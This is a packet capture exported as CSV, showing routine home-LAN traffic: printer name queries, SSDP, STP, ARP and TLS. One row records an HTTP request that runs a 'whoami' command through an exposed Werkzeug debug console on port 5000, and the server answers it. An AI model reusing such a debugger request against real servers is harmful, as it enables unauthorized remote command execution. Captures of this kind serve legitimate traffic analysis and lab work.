"Time","Source","Src Port","Destination","Dst Port","Protocol","Length","Data","Info"
"146.205706273","192.168.1.137","","224.0.0.252","","IGMPv2","60","","Membership Report group 224.0.0.252"
"146.205706323","192.168.1.137","","239.255.255.250","","IGMPv2","60","","Membership Report group 239.255.255.250"
"146.221137929","192.168.1.137","137","192.168.1.255","137","NBNS","92","","Name query NB BRW7440BBBE4A3A<00>"
"146.221306678","192.168.1.137","5353","224.0.0.251","5353","MDNS","81","","Standard query 0x0000 A BRW7440BBBE4A3A.local, ""QM"" question"
"146.221796917","fe80::150d:e1f2:b6e9:6559","5353","ff02::fb","5353","MDNS","101","","Standard query 0x0000 A BRW7440BBBE4A3A.local, ""QM"" question"
"146.222555280","fe80::150d:e1f2:b6e9:6559","56982","ff02::1:3","5355","LLMNR","95","","Standard query 0x9a9f A BRW7440BBBE4A3A"
"146.222662896","192.168.1.137","56982","224.0.0.252","5355","LLMNR","75","","Standard query 0x9a9f A BRW7440BBBE4A3A"
"146.223151794","192.168.1.137","5353","224.0.0.251","5353","MDNS","81","","Standard query 0x0000 A BRW7440BBBE4A3A.local, ""QM"" question"
"146.223540620","fe80::150d:e1f2:b6e9:6559","5353","ff02::fb","5353","MDNS","101","","Standard query 0x0000 A BRW7440BBBE4A3A.local, ""QM"" question"
"146.511110679","192.168.1.9","58597","239.255.255.250","1900","SSDP","216","","M-SEARCH * HTTP/1.1 "
"146.638174788","fe80::150d:e1f2:b6e9:6559","56982","ff02::1:3","5355","LLMNR","95","","Standard query 0x9a9f A BRW7440BBBE4A3A"
"146.638175319","192.168.1.137","56982","224.0.0.252","5355","LLMNR","75","","Standard query 0x9a9f A BRW7440BBBE4A3A"
"146.748485841","192.168.1.147","11601","239.255.255.250","1900","SSDP","215","","M-SEARCH * HTTP/1.1 "
"146.749433807","192.168.1.147","11601","239.255.255.250","1900","SSDP","215","","M-SEARCH * HTTP/1.1 "
"146.977952577","192.168.1.137","137","192.168.1.255","137","NBNS","92","","Name query NB BRW7440BBBE4A3A<00>"
"147.100779611","192.168.1.137","1900","192.168.1.147","11601","SSDP","481","","HTTP/1.1 200 OK "
"147.225628821","192.168.1.137","5353","224.0.0.251","5353","MDNS","81","","Standard query 0x0000 A BRW7440BBBE4A3A.local, ""QM"" question"
"147.226413020","fe80::150d:e1f2:b6e9:6559","5353","ff02::fb","5353","MDNS","101","","Standard query 0x0000 A BRW7440BBBE4A3A.local, ""QM"" question"
"147.226856408","192.168.1.137","5353","224.0.0.251","5353","MDNS","81","","Standard query 0x0000 A BRW7440BBBE4A3A.local, ""QM"" question"
"147.227245445","fe80::150d:e1f2:b6e9:6559","5353","ff02::fb","5353","MDNS","101","","Standard query 0x0000 A BRW7440BBBE4A3A.local, ""QM"" question"
"147.514963343","192.168.1.9","58597","239.255.255.250","1900","SSDP","216","","M-SEARCH * HTTP/1.1 "
"147.739337629","192.168.1.137","137","192.168.1.255","137","NBNS","92","","Name query NB BRW7440BBBE4A3A<00>"
"148.086053623","192.168.1.254","44869","192.168.1.255","9995","UDP","139","0130203139322e3136382e312e3235340000000000000000000000000000000000737465â\200\246","44869  >  9995 Len=97"
"148.115729670","Arcadyan_6e:fd:ca","","Spanning-tree-(for-bridges)_00","","STP","60","","Conf. Root = 32768/0/a4:ce:da:6e:fd:ca  Cost = 0  Port = 0x8003"
"148.517669878","192.168.1.9","58597","239.255.255.250","1900","SSDP","216","","M-SEARCH * HTTP/1.1 "
"148.612588598","192.168.1.137","137","192.168.1.255","137","NBNS","92","","Name query NB BRW7440BBBE4A3A<00>"
"148.612877613","192.168.1.137","5353","224.0.0.251","5353","MDNS","81","","Standard query 0x0000 A BRW7440BBBE4A3A.local, ""QM"" question"
"148.613428788","fe80::150d:e1f2:b6e9:6559","5353","ff02::fb","5353","MDNS","101","","Standard query 0x0000 A BRW7440BBBE4A3A.local, ""QM"" question"
"148.614167646","fe80::150d:e1f2:b6e9:6559","52078","ff02::1:3","5355","LLMNR","95","","Standard query 0xe316 A BRW7440BBBE4A3A"
"148.614230155","192.168.1.137","52078","224.0.0.252","5355","LLMNR","75","","Standard query 0xe316 A BRW7440BBBE4A3A"
"148.614713800","192.168.1.137","5353","224.0.0.251","5353","MDNS","81","","Standard query 0x0000 A BRW7440BBBE4A3A.local, ""QM"" question"
"148.615133766","fe80::150d:e1f2:b6e9:6559","5353","ff02::fb","5353","MDNS","101","","Standard query 0x0000 A BRW7440BBBE4A3A.local, ""QM"" question"
"149.039190905","fe80::150d:e1f2:b6e9:6559","52078","ff02::1:3","5355","LLMNR","95","","Standard query 0xe316 A BRW7440BBBE4A3A"
"149.039191376","192.168.1.137","52078","224.0.0.252","5355","LLMNR","75","","Standard query 0xe316 A BRW7440BBBE4A3A"
"149.107767322","Arcadyan_6e:fd:ca","","Spanning-tree-(for-bridges)_ef:03:fe","","0xfe68","111","030304859dcd00800180c2ef03fea4ceda6efdcd00545249030300859dcd0080020305a7â\200\246","Ethernet II"
"149.108165184","Arcadyan_6e:fd:ca","","Spanning-tree-(for-bridges)_ef:03:fe","","0xfe68","111","030304859dcd00800180c2ef03fea4ceda6efdcd00545249030300859dcd0080020305a7â\200\246","Ethernet II"
"149.108165224","Arcadyan_6e:fd:ca","","Spanning-tree-(for-bridges)_ef:03:fe","","0xfe68","111","030304859dcd00800180c2ef03fea4ceda6efdcd00545249030300859dcd0080020305a7â\200\246","Ethernet II"
"149.108165254","Arcadyan_6e:fd:ca","","Spanning-tree-(for-bridges)_ef:03:fe","","0xfe68","111","030304859dcd00800180c2ef03fea4ceda6efdcd00545249030300859dcd0080020305a7â\200\246","Ethernet II"
"149.108342213","Arcadyan_6e:fd:ca","","Spanning-tree-(for-bridges)_ef:03:fe","","0xfe68","111","030304859dcd00800180c2ef03fea4ceda6efdcd00545249030300859dcd0080020305a7â\200\246","Ethernet II"
"149.108768199","Arcadyan_6e:fd:ca","","Spanning-tree-(for-bridges)_ef:03:fe","","0xfe68","111","030304859dcd00800180c2ef03fea4ceda6efdcd00545249030300859dcd0080020305a7â\200\246","Ethernet II"
"149.108768269","Arcadyan_6e:fd:ca","","Spanning-tree-(for-bridges)_ef:03:fe","","0xfe68","111","030304859dcd00800180c2ef03fea4ceda6efdcd00545249030300859dcd0080020305a7â\200\246","Ethernet II"
"149.109770037","Arcadyan_6e:fd:ca","","Spanning-tree-(for-bridges)_ef:03:fe","","0xfe68","111","030304859dcd00800180c2ef03fea4ceda6efdcd00545249030300859dcd0080020305a7â\200\246","Ethernet II"
"149.110046196","Arcadyan_6e:fd:ca","","Spanning-tree-(for-bridges)_ef:03:fe","","0xfe68","102","030304859dcd00c00180c2ef03fea4ceda6efdcd0d54524903030d859dcd00c0020305a7â\200\246","Ethernet II"
"149.110568166","Arcadyan_6e:fd:ca","","Spanning-tree-(for-bridges)_ef:03:fe","","0xfe68","180","030304859dcd00c00180c2ef03fea4ceda6efdcd0d54524903030e859dcd00c008038303â\200\246","Ethernet II"
"149.224778748","192.168.1.137","1900","192.168.1.147","11601","SSDP","481","","HTTP/1.1 200 OK "
"149.364384728","192.168.1.137","137","192.168.1.255","137","NBNS","92","","Name query NB BRW7440BBBE4A3A<00>"
"149.510586230","192.168.1.227","42434","192.168.1.1","8009","TCP","176","","42434  >  8009 [PSH, ACK] Seq=3191 Ack=3191 Win=501 Len=110 TSval=2919304478 TSecr=1841391069 [TCP segment of a reassembled PDU]"
"149.513310154","192.168.1.1","8009","192.168.1.227","42434","TCP","176","","8009  >  42434 [PSH, ACK] Seq=3191 Ack=3301 Win=503 Len=110 TSval=1841396077 TSecr=2919304478 [TCP segment of a reassembled PDU]"
"149.513374156","192.168.1.227","42434","192.168.1.1","8009","TCP","66","","42434  >  8009 [ACK] Seq=3301 Ack=3301 Win=501 Len=0 TSval=2919304481 TSecr=1841396077"
"149.533436694","192.168.1.137","56461","192.168.1.1","8009","TCP","164","","56461  >  8009 [PSH, ACK] Seq=3191 Ack=3191 Win=1022 Len=110 [TCP segment of a reassembled PDU]"
"149.539524691","192.168.1.1","8009","192.168.1.137","56461","TCP","164","","8009  >  56461 [PSH, ACK] Seq=3191 Ack=3301 Win=507 Len=110 [TCP segment of a reassembled PDU]"
"149.594982871","192.168.1.137","56461","192.168.1.1","8009","TCP","60","","56461  >  8009 [ACK] Seq=3301 Ack=3301 Win=1021 Len=0"
"149.626212540","192.168.1.137","5353","224.0.0.251","5353","MDNS","81","","Standard query 0x0000 A BRW7440BBBE4A3A.local, ""QM"" question"
"149.626713920","fe80::150d:e1f2:b6e9:6559","5353","ff02::fb","5353","MDNS","101","","Standard query 0x0000 A BRW7440BBBE4A3A.local, ""QM"" question"
"149.627180507","192.168.1.137","5353","224.0.0.251","5353","MDNS","81","","Standard query 0x0000 A BRW7440BBBE4A3A.local, ""QM"" question"
"149.627584908","fe80::150d:e1f2:b6e9:6559","5353","ff02::fb","5353","MDNS","101","","Standard query 0x0000 A BRW7440BBBE4A3A.local, ""QM"" question"
"150.115784054","Arcadyan_6e:fd:ca","","Spanning-tree-(for-bridges)_00","","STP","60","","Conf. Root = 32768/0/a4:ce:da:6e:fd:ca  Cost = 0  Port = 0x8003"
"150.122237094","192.168.1.137","137","192.168.1.255","137","NBNS","92","","Name query NB BRW7440BBBE4A3A<00>"
"150.990576179","192.168.1.137","137","192.168.1.255","137","NBNS","92","","Name query NB BRW7440BBBE4A3A<00>"
"150.990754517","192.168.1.137","5353","224.0.0.251","5353","MDNS","81","","Standard query 0x0000 A BRW7440BBBE4A3A.local, ""QM"" question"
"150.991225062","fe80::150d:e1f2:b6e9:6559","5353","ff02::fb","5353","MDNS","101","","Standard query 0x0000 A BRW7440BBBE4A3A.local, ""QM"" question"
"150.991966221","fe80::150d:e1f2:b6e9:6559","56165","ff02::1:3","5355","LLMNR","95","","Standard query 0x2652 A BRW7440BBBE4A3A"
"150.992073216","192.168.1.137","56165","224.0.0.252","5355","LLMNR","75","","Standard query 0x2652 A BRW7440BBBE4A3A"
"150.992530919","192.168.1.137","5353","224.0.0.251","5353","MDNS","81","","Standard query 0x0000 A BRW7440BBBE4A3A.local, ""QM"" question"
"150.992960956","fe80::150d:e1f2:b6e9:6559","5353","ff02::fb","5353","MDNS","101","","Standard query 0x0000 A BRW7440BBBE4A3A.local, ""QM"" question"
"151.409110716","fe80::150d:e1f2:b6e9:6559","56165","ff02::1:3","5355","LLMNR","95","","Standard query 0x2652 A BRW7440BBBE4A3A"
"151.409111418","192.168.1.137","56165","224.0.0.252","5355","LLMNR","75","","Standard query 0x2652 A BRW7440BBBE4A3A"
"151.703331893","ASIXElec_68:a5:38","","BaiduOnl_27:dc:9e","","ARP","60","","Who has 192.168.1.147? Tell 192.168.1.137"
"151.716926567","BaiduOnl_27:dc:9e","","ASIXElec_68:a5:38","","ARP","60","","192.168.1.147 is at 88:2d:53:27:dc:9e"
"151.750797797","192.168.1.137","137","192.168.1.255","137","NBNS","92","","Name query NB BRW7440BBBE4A3A<00>"
"152.000515841","192.168.1.137","5353","224.0.0.251","5353","MDNS","81","","Standard query 0x0000 A BRW7440BBBE4A3A.local, ""QM"" question"
"152.001068633","fe80::150d:e1f2:b6e9:6559","5353","ff02::fb","5353","MDNS","101","","Standard query 0x0000 A BRW7440BBBE4A3A.local, ""QM"" question"
"152.001469929","192.168.1.137","5353","224.0.0.251","5353","MDNS","81","","Standard query 0x0000 A BRW7440BBBE4A3A.local, ""QM"" question"
"152.001874807","fe80::150d:e1f2:b6e9:6559","5353","ff02::fb","5353","MDNS","101","","Standard query 0x0000 A BRW7440BBBE4A3A.local, ""QM"" question"
"152.095457952","IntelCor_1d:00:dd","","Broadcast","","ARP","60","","Who has 192.168.1.31? Tell 192.168.1.197"
"152.115720600","Arcadyan_6e:fd:ca","","Spanning-tree-(for-bridges)_00","","STP","60","","Conf. Root = 32768/0/a4:ce:da:6e:fd:ca  Cost = 0  Port = 0x8003"
"152.115721201","Arcadyan_6e:fd:ca","","Spanning-tree-(for-bridges)_ef:03:fe","","0xfe68","111","030304859dce00800180c2ef03fea4ceda6efdcd00545249030300859dce0080bfbeb81aâ\200\246","Ethernet II"
"152.115721241","Arcadyan_6e:fd:ca","","Spanning-tree-(for-bridges)_ef:03:fe","","0xfe68","111","030304859dce00800180c2ef03fea4ceda6efdcd00545249030300859dce0080bfbeb81aâ\200\246","Ethernet II"
"152.115926775","Arcadyan_6e:fd:ca","","Spanning-tree-(for-bridges)_ef:03:fe","","0xfe68","111","030304859dce00800180c2ef03fea4ceda6efdcd00545249030300859dce0080bfbeb81aâ\200\246","Ethernet II"
"152.115926865","Arcadyan_6e:fd:ca","","Spanning-tree-(for-bridges)_ef:03:fe","","0xfe68","111","030304859dce00800180c2ef03fea4ceda6efdcd00545249030300859dce0080bfbeb81aâ\200\246","Ethernet II"
"152.115926905","Arcadyan_6e:fd:ca","","Spanning-tree-(for-bridges)_ef:03:fe","","0xfe68","111","030304859dce00800180c2ef03fea4ceda6efdcd00545249030300859dce0080bfbeb81aâ\200\246","Ethernet II"
"152.115926945","Arcadyan_6e:fd:ca","","Spanning-tree-(for-bridges)_ef:03:fe","","0xfe68","111","030304859dce00800180c2ef03fea4ceda6efdcd00545249030300859dce0080bfbeb81aâ\200\246","Ethernet II"
"152.116113463","Arcadyan_6e:fd:ca","","Spanning-tree-(for-bridges)_ef:03:fe","","0xfe68","111","030304859dce00800180c2ef03fea4ceda6efdcd00545249030300859dce0080bfbeb81aâ\200\246","Ethernet II"
"152.116113513","Arcadyan_6e:fd:ca","","Spanning-tree-(for-bridges)_ef:03:fe","","0xfe68","111","030304859dce00800180c2ef03fea4ceda6efdcd00545249030300859dce0080bfbeb81aâ\200\246","Ethernet II"
"152.116113553","Arcadyan_6e:fd:ca","","Spanning-tree-(for-bridges)_ef:03:fe","","0xfe68","102","030304859dce00c00180c2ef03fea4ceda6efdcd0d54524903030d859dce00c0bfbeb81aâ\200\246","Ethernet II"
"152.116458624","Arcadyan_6e:fd:ca","","Spanning-tree-(for-bridges)_ef:03:fe","","0xfe68","180","030304859dce00c00180c2ef03fea4ceda6efdcd0d54524903030e859dce00c0b5be3ebeâ\200\246","Ethernet II"
"152.510102937","192.168.1.137","137","192.168.1.255","137","NBNS","92","","Name query NB BRW7440BBBE4A3A<00>"
"152.684888458","192.168.1.227","32998","192.168.1.183","5000","TCP","74","","32998  >  5000 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM TSval=2341656957 TSecr=0 WS=128"
"152.685196508","192.168.1.183","5000","192.168.1.227","32998","TCP","74","","5000  >  32998 [SYN, ACK] Seq=0 Ack=1 Win=65160 Len=0 MSS=1460 SACK_PERM TSval=1741637169 TSecr=2341656957 WS=128"
"152.685486584","192.168.1.227","32998","192.168.1.183","5000","TCP","66","","32998  >  5000 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2341656958 TSecr=1741637169"
"152.685665476","192.168.1.227","32998","192.168.1.183","5000","HTTP","542","","GET /console?&__debugger__=yes&cmd=subprocess.check_output(%5B%22whoami%22%5D)&frm=0&s=CvokZoT2hAwJh0pLGKhC HTTP/1.1 "
"152.685673091","192.168.1.183","5000","192.168.1.227","32998","TCP","66","","5000  >  32998 [ACK] Seq=1 Ack=477 Win=64768 Len=0 TSval=1741637170 TSecr=2341656958"
"152.692426089","192.168.1.183","5000","192.168.1.227","32998","TCP","239","","5000  >  32998 [PSH, ACK] Seq=1 Ack=477 Win=64768 Len=173 TSval=1741637176 TSecr=2341656958 [TCP segment of a reassembled PDU]"
"152.692541740","192.168.1.183","5000","192.168.1.227","32998","HTTP","159","","HTTP/1.1 200 OK  (text/html)"
"152.692804321","192.168.1.227","32998","192.168.1.183","5000","TCP","66","","32998  >  5000 [ACK] Seq=477 Ack=174 Win=64128 Len=0 TSval=2341656965 TSecr=1741637176"
"152.693151201","192.168.1.227","32998","192.168.1.183","5000","TCP","66","","32998  >  5000 [FIN, ACK] Seq=477 Ack=268 Win=64128 Len=0 TSval=2341656965 TSecr=1741637176"
"152.693165869","192.168.1.183","5000","192.168.1.227","32998","TCP","66","","5000  >  32998 [ACK] Seq=268 Ack=478 Win=64768 Len=0 TSval=1741637177 TSecr=2341656965"
"152.798262898","IntelCor_1d:00:dd","","Broadcast","","ARP","60","","Who has 192.168.1.31? Tell 192.168.1.197"
"152.951969069","192.168.1.146","11586","239.255.255.250","1900","SSDP","243","","M-SEARCH * HTTP/1.1 "
"153.120068052","192.168.1.254","44869","192.168.1.255","9995","UDP","139","0130203139322e3136382e312e3235340000000000000000000000000000000000737465â\200\246","44869  >  9995 Len=97"
"153.382589770","192.168.1.137","137","192.168.1.255","137","NBNS","92","","Name query NB BRW7440BBBE4A3A<00>"
"153.382804178","192.168.1.137","5353","224.0.0.251","5353","MDNS","81","","Standard query 0x0000 A BRW7440BBBE4A3A.local, ""QM"" question"
"153.383255302","fe80::150d:e1f2:b6e9:6559","5353","ff02::fb","5353","MDNS","101","","Standard query 0x0000 A BRW7440BBBE4A3A.local, ""QM"" question"
"153.383886954","fe80::150d:e1f2:b6e9:6559","60533","ff02::1:3","5355","LLMNR","95","","Standard query 0x1fb4 A BRW7440BBBE4A3A"
"153.383982196","192.168.1.137","60533","224.0.0.252","5355","LLMNR","75","","Standard query 0x1fb4 A BRW7440BBBE4A3A"
"153.384333289","192.168.1.137","5353","224.0.0.251","5353","MDNS","81","","Standard query 0x0000 A BRW7440BBBE4A3A.local, ""QM"" question"
"153.384627753","fe80::150d:e1f2:b6e9:6559","5353","ff02::fb","5353","MDNS","101","","Standard query 0x0000 A BRW7440BBBE4A3A.local, ""QM"" question"
"153.798284165","IntelCor_1d:00:dd","","Broadcast","","ARP","60","","Who has 192.168.1.31? Tell 192.168.1.197"
"153.802869739","fe80::150d:e1f2:b6e9:6559","60533","ff02::1:3","5355","LLMNR","95","","Standard query 0x1fb4 A BRW7440BBBE4A3A"
"153.802870189","192.168.1.137","60533","224.0.0.252","5355","LLMNR","75","","Standard query 0x1fb4 A BRW7440BBBE4A3A"
"154.115842170","Arcadyan_6e:fd:ca","","Spanning-tree-(for-bridges)_00","","STP","60","","Conf. Root = 32768/0/a4:ce:da:6e:fd:ca  Cost = 0  Port = 0x8003"
"154.145010094","192.168.1.137","137","192.168.1.255","137","NBNS","92","","Name query NB BRW7440BBBE4A3A<00>"
"154.238222346","192.168.1.147","11601","239.255.255.250","1900","SSDP","215","","M-SEARCH * HTTP/1.1 "
"154.238778364","192.168.1.147","11601","239.255.255.250","1900","SSDP","215","","M-SEARCH * HTTP/1.1 "
"154.276320162","192.168.1.227","55024","162.159.200.123","123","NTP","90","","NTP Version 4, client"
"154.280116366","162.159.200.123","123","192.168.1.227","55024","NTP","90","","NTP Version 4, server"
"154.283941860","192.168.1.137","1900","192.168.1.147","11601","SSDP","481","","HTTP/1.1 200 OK "
"154.392592594","192.168.1.137","5353","224.0.0.251","5353","MDNS","81","","Standard query 0x0000 A BRW7440BBBE4A3A.local, ""QM"" question"
"154.393492770","fe80::150d:e1f2:b6e9:6559","5353","ff02::fb","5353","MDNS","101","","Standard query 0x0000 A BRW7440BBBE4A3A.local, ""QM"" question"
"154.393788126","192.168.1.137","5353","224.0.0.251","5353","MDNS","81","","Standard query 0x0000 A BRW7440BBBE4A3A.local, ""QM"" question"
"154.394199601","fe80::150d:e1f2:b6e9:6559","5353","ff02::fb","5353","MDNS","101","","Standard query 0x0000 A BRW7440BBBE4A3A.local, ""QM"" question"
"154.519133180","192.168.1.227","42434","192.168.1.1","8009","TCP","176","","42434  >  8009 [PSH, ACK] Seq=3301 Ack=3301 Win=501 Len=110 TSval=2919309486 TSecr=1841396077 [TCP segment of a reassembled PDU]"
"154.521289910","192.168.1.1","8009","192.168.1.227","42434","TCP","176","","8009  >  42434 [PSH, ACK] Seq=3301 Ack=3411 Win=503 Len=110 TSval=1841401085 TSecr=2919309486 [TCP segment of a reassembled PDU]"
"154.521431044","192.168.1.227","42434","192.168.1.1","8009","TCP","66","","42434  >  8009 [ACK] Seq=3411 Ack=3411 Win=501 Len=0 TSval=2919309489 TSecr=1841401085"
"154.545484913","192.168.1.137","56461","192.168.1.1","8009","TCP","164","","56461  >  8009 [PSH, ACK] Seq=3301 Ack=3301 Win=1021 Len=110 [TCP segment of a reassembled PDU]"
"154.554246550","192.168.1.1","8009","192.168.1.137","56461","TCP","164","","8009  >  56461 [PSH, ACK] Seq=3301 Ack=3411 Win=507 Len=110 [TCP segment of a reassembled PDU]"
"154.607657691","192.168.1.137","56461","192.168.1.1","8009","TCP","60","","56461  >  8009 [ACK] Seq=3411 Ack=3411 Win=1021 Len=0"
"154.902485976","192.168.1.137","137","192.168.1.255","137","NBNS","92","","Name query NB BRW7440BBBE4A3A<00>"
"154.965264272","192.168.1.137","1900","192.168.1.147","11601","SSDP","481","","HTTP/1.1 200 OK "
"155.123929668","Arcadyan_6e:fd:ca","","Spanning-tree-(for-bridges)_ef:03:fe","","0xfe68","111","030304859dcf00800180c2ef03fea4ceda6efdcd00545249030300859dcf0080535254f6â\200\246","Ethernet II"
"155.123930560","Arcadyan_6e:fd:ca","","Spanning-tree-(for-bridges)_ef:03:fe","","0xfe68","111","030304859dcf00800180c2ef03fea4ceda6efdcd00545249030300859dcf0080535254f6â\200\246","Ethernet II"
"155.123930590","Arcadyan_6e:fd:ca","","Spanning-tree-(for-bridges)_ef:03:fe","","0xfe68","111","030304859dcf00800180c2ef03fea4ceda6efdcd00545249030300859dcf0080535254f6â\200\246","Ethernet II"
"155.124007848","Arcadyan_6e:fd:ca","","Spanning-tree-(for-bridges)_ef:03:fe","","0xfe68","111","030304859dcf00800180c2ef03fea4ceda6efdcd00545249030300859dcf0080535254f6â\200\246","Ethernet II"
"155.124007888","Arcadyan_6e:fd:ca","","Spanning-tree-(for-bridges)_ef:03:fe","","0xfe68","111","030304859dcf00800180c2ef03fea4ceda6efdcd00545249030300859dcf0080535254f6â\200\246","Ethernet II"
"155.124007908","Arcadyan_6e:fd:ca","","Spanning-tree-(for-bridges)_ef:03:fe","","0xfe68","111","030304859dcf00800180c2ef03fea4ceda6efdcd00545249030300859dcf0080535254f6â\200\246","Ethernet II"
"155.124007938","Arcadyan_6e:fd:ca","","Spanning-tree-(for-bridges)_ef:03:fe","","0xfe68","111","030304859dcf00800180c2ef03fea4ceda6efdcd00545249030300859dcf0080535254f6â\200\246","Ethernet II"
"155.124268598","Arcadyan_6e:fd:ca","","Spanning-tree-(for-bridges)_ef:03:fe","","0xfe68","111","030304859dcf00800180c2ef03fea4ceda6efdcd00545249030300859dcf0080535254f6â\200\246","Ethernet II"
"155.124268658","Arcadyan_6e:fd:ca","","Spanning-tree-(for-bridges)_ef:03:fe","","0xfe68","102","030304859dcf00c00180c2ef03fea4ceda6efdcd0d54524903030d859dcf00c0535254f6â\200\246","Ethernet II"
"155.124268688","Arcadyan_6e:fd:ca","","Spanning-tree-(for-bridges)_ef:03:fe","","0xfe68","180","030304859dcf00c00180c2ef03fea4ceda6efdcd0d54524903030e859dcf00c05952d252â\200\246","Ethernet II"
"155.127061887","142.250.4.95","443","192.168.1.137","57769","TLSv1.2","139","","Application Data"
"155.178787595","74.125.24.95","443","192.168.1.137","54876","UDP","74","4f9773769c55b5a8fd42b8d5adc98ce6d3680210550296232762da7a30105f1e","443  >  54876 Len=32"
"155.181632784","192.168.1.137","57769","142.250.4.95","443","TCP","60","","57769  >  443 [ACK] Seq=3516 Ack=2020 Win=1023 Len=0"
"155.181632904","192.168.1.137","54876","74.125.24.95","443","UDP","80","50e9c4402d790422b461aa96c1828f575c1235b29083905f04d3056893bc73ae41e31ec6â\200\246","54876  >  443 Len=38"
"155.185653823","74.125.24.95","443","192.168.1.137","54876","UDP","67","4a9a9e8b6e95f9dba8259f90c80c25dfeb0c65fadf79374f10","443  >  54876 Len=25"
"155.779755899","192.168.1.137","137","192.168.1.255","137","NBNS","92","","Name query NB BRW7440BBBE4A3A<00>"
"155.780009401","192.168.1.137","5353","224.0.0.251","5353","MDNS","81","","Standard query 0x0000 A BRW7440BBBE4A3A.local, ""QM"" question"
"155.780525282","fe80::150d:e1f2:b6e9:6559","5353","ff02::fb","5353","MDNS","101","","Standard query 0x0000 A BRW7440BBBE4A3A.local, ""QM"" question"
"155.781239250","fe80::150d:e1f2:b6e9:6559","59536","ff02::1:3","5355","LLMNR","95","","Standard query 0xd9c6 A BRW7440BBBE4A3A"
"155.781347257","192.168.1.137","59536","224.0.0.252","5355","LLMNR","75","","Standard query 0xd9c6 A BRW7440BBBE4A3A"
"155.781778152","192.168.1.137","5353","224.0.0.251","5353","MDNS","81","","Standard query 0x0000 A BRW7440BBBE4A3A.local, ""QM"" question"
"155.782176355","fe80::150d:e1f2:b6e9:6559","5353","ff02::fb","5353","MDNS","101","","Standard query 0x0000 A BRW7440BBBE4A3A.local, ""QM"" question"
"155.801128169","192.168.1.137","61520","142.251.10.113","443","UDP","71","43e5e20ce33157ac58ca34bb5c4d74607f61261277bef93e662a214a15","61520  >  443 Len=29"
"155.805323974","142.251.10.113","443","192.168.1.137","61520","UDP","73","56703d8f907639a58fc84f52b118784391f7b25057eb6ae018883436d21d04","443  >  61520 Len=31"
"156.115941027","Arcadyan_6e:fd:ca","","Spanning-tree-(for-bridges)_00","","STP","60","","Conf. Root = 32768/0/a4:ce:da:6e:fd:ca  Cost = 0  Port = 0x8003"
"156.194921945","fe80::150d:e1f2:b6e9:6559","59536","ff02::1:3","5355","LLMNR","95","","Standard query 0xd9c6 A BRW7440BBBE4A3A"
"156.194922446","192.168.1.137","59536","224.0.0.252","5355","LLMNR","75","","Standard query 0xd9c6 A BRW7440BBBE4A3A"
"156.536622506","192.168.1.137","137","192.168.1.255","137","NBNS","92","","Name query NB BRW7440BBBE4A3A<00>"
"156.785389133","192.168.1.137","5353","224.0.0.251","5353","MDNS","81","","Standard query 0x0000 A BRW7440BBBE4A3A.local, ""QM"" question"
"156.785961443","fe80::150d:e1f2:b6e9:6559","5353","ff02::fb","5353","MDNS","101","","Standard query 0x0000 A BRW7440BBBE4A3A.local, ""QM"" question"
"156.786358951","192.168.1.137","5353","224.0.0.251","5353","MDNS","81","","Standard query 0x0000 A BRW7440BBBE4A3A.local, ""QM"" question"
"156.786734974","fe80::150d:e1f2:b6e9:6559","5353","ff02::fb","5353","MDNS","101","","Standard query 0x0000 A BRW7440BBBE4A3A.local, ""QM"" question"
"156.799370164","192.168.1.9","60901","239.255.255.250","1900","SSDP","217","","M-SEARCH * HTTP/1.1 "
"157.295931442","192.168.1.137","137","192.168.1.255","137","NBNS","92","","Name query NB BRW7440BBBE4A3A<00>"
"157.769721047","192.168.1.137","57274","142.251.12.113","443","TLSv1.2","2505","","Application Data"
"157.769721538","192.168.1.137","57274","142.251.12.113","443","TLSv1.2","6645","","Application Data"
"157.770041817","192.168.1.137","61520","142.251.10.113","443","UDP","1399","67e5e20ce33157ac586de0fdbd8da71ac8b73210a9b1d4602749f203bd4cb6cc9dd5e631â\200\246","61520  >  443 Len=1357"
"157.770041998","192.168.1.137","61520","142.251.10.113","443","UDP","1399","62e5e20ce33157ac58ca795d678663a754ece1376ee56f8eb1c8d3b8400c7d4c0056edceâ\200\246","61520  >  443 Len=1357"
"157.770042038","192.168.1.137","61520","142.251.10.113","443","UDP","1399","7ee5e20ce33157ac5823172531d6861a49f676c13576078b1f1025f7e3c5341b47dbcf28â\200\246","61520  >  443 Len=1357"
"157.770042068","192.168.1.137","61520","142.251.10.113","443","UDP","1399","5ee5e20ce33157ac589e16e3051fd718276e1f87ec5ecb9d2fa70e8f515f045eefb5f398â\200\246","61520  >  443 Len=1357"
